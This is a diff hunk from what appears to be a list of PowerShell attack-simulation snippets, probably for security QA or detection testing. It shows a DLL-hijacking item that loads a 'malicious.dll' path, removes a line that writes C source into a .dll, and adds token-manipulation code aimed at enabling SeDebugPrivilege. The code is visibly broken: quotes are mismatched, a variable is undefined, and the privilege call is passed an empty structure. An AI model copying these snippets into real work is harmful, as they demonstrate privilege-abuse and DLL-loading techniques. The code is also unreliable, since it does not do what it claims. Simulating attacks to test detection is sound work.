@@ -74,7 +74,21 @@ Start-Process -FilePath "msdt.exe"
 24. QA_Potential DLL Hijacking
 $code = '[DllImport(\kernel32.dll\")]`npublic static extern IntPtr LoadLibrary(string dllToLoad);`n`npublic static void Main(){`n    string dllPath = \"C:\\\\Path\\\\to\\\\malicious.dll\";`n    LoadLibrary(dllPath);`n}' | Out-File -FilePath C:\\malicious.cs -Encoding ASCII; Add-Type -TypeDefinition $code -Language CSharp; Start-Process -FilePath 'notepad.exe' -ArgumentList 'C:\\malicious.dll'"
 
-"@#include <windows.h> BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { switch (fdwReason) { case DLL_PROCESS_ATTACH: MessageBoxA(NULL, 'Malicious DLL loaded!', 'DLL Hijacking', MB_OK | MB_ICONWARNING); break; case DLL_PROCESS_DETACH: break; } return TRUE; }" | Out-File -FilePath 'C:\Temp\Malicious.dll' -Encoding ASCII -Force; try {[System.Reflection.Assembly]::LoadFile('C:\Temp\Malicious.dll')} catch {Write-Output "Failed to load DLL: $_"}
+$ProcessHandle = (Get-Process -Id $PID).Handle
+$Advapi32 = Add-Type -MemberDefinition @"
+[DllImport("advapi32.dll", SetLastError = true)]
+public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+[DllImport("advapi32.dll", SetLastError = true)]
+public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out IntPtr lpLuid);
+[DllImport("advapi32.dll", SetLastError = true)]
+public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, IntPtr NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+"@
+$TokenHandle = [IntPtr]::Zero
+$Advapi32::OpenProcessToken($ProcessHandle, 0x0020, [ref]$TokenHandle) | Out-Null
+$Advapi32::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$Luid) | Out-Null
+$Privileges = New-Object -TypeName "IntPtr"
+$Advapi32::AdjustTokenPrivileges($TokenHandle, $false, $Privileges, 0, [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
+
 
 
 
